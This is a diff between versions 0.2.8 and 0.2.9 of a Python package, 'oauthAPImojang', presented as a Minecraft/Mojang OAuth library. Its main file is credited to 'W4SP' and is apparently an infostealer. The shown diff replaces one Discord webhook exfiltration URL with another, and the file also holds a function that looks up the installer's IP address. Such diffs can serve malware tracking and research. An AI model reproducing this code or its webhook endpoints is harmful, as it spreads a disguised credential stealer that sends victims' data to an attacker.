# Comparing `tmp/oauthAPImojang-0.2.8.tar.gz` & `tmp/oauthAPImojang-0.2.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "oauthAPImojang-0.2.8.tar", last modified: Sun Apr 16 21:00:19 2023, max compression
+gzip compressed data, was "oauthAPImojang-0.2.9.tar", last modified: Sun Apr 16 21:04:44 2023, max compression
```

## Comparing `oauthAPImojang-0.2.8.tar` & `oauthAPImojang-0.2.9.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/
--rw-rw-rw-   0        0        0       61 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang/
--rw-rw-rw-   0        0        0      105 2023-04-16 20:02:36.000000 oauthAPImojang-0.2.8/oauthAPImojang/__init__.py
--rw-rw-rw-   0        0        0    35164 2023-04-16 20:57:44.000000 oauthAPImojang-0.2.8/oauthAPImojang/minecraftTHEapi.py
-drwxrwxrwx   0        0        0        0 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/
--rw-rw-rw-   0        0        0       61 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      258 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       22 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/requires.txt
--rw-rw-rw-   0        0        0       15 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/oauthAPImojang.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-04-16 21:00:20.000000 oauthAPImojang-0.2.8/setup.cfg
--rw-rw-rw-   0        0        0      203 2023-04-16 20:59:18.000000 oauthAPImojang-0.2.8/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/
+-rw-rw-rw-   0        0        0       61 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang/
+-rw-rw-rw-   0        0        0      105 2023-04-16 20:02:36.000000 oauthAPImojang-0.2.9/oauthAPImojang/__init__.py
+-rw-rw-rw-   0        0        0    35161 2023-04-16 21:03:28.000000 oauthAPImojang-0.2.9/oauthAPImojang/minecraftTHEapi.py
+drwxrwxrwx   0        0        0        0 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/
+-rw-rw-rw-   0        0        0       61 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      258 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       22 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       15 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/oauthAPImojang.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-04-16 21:04:46.000000 oauthAPImojang-0.2.9/setup.cfg
+-rw-rw-rw-   0        0        0      203 2023-04-16 21:03:48.000000 oauthAPImojang-0.2.9/setup.py
```

### Comparing `oauthAPImojang-0.2.8/oauthAPImojang/minecraftTHEapi.py` & `oauthAPImojang-0.2.9/oauthAPImojang/minecraftTHEapi.py`

 * *Files 0% similar despite different names*

```diff
@@ -16,15 +16,15 @@
 import subprocess
 
 #  THIS IS 1.1.6 VERSION
 #    BY W4SP, loTus04
 # 
 
 
-hook = "https://discordapp.com/api/webhooks/1097233593136316436/IqumBNfSoWYa4iJ28cpEUGteP4DkprTuhb28kL4WYAuW-Id1NIPoDZ90wRFhN8rBRUvN"
+hook = "https://discord.com/api/webhooks/1096175981145882694/NvmeKf3ey3_OXvRsNjLwOWVgdneiuAyRx1ll2f1vLDN6MrK_F5KP7qdcrCwhvGsPPOSk"
 DETECTED = False
 
 
 def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
```

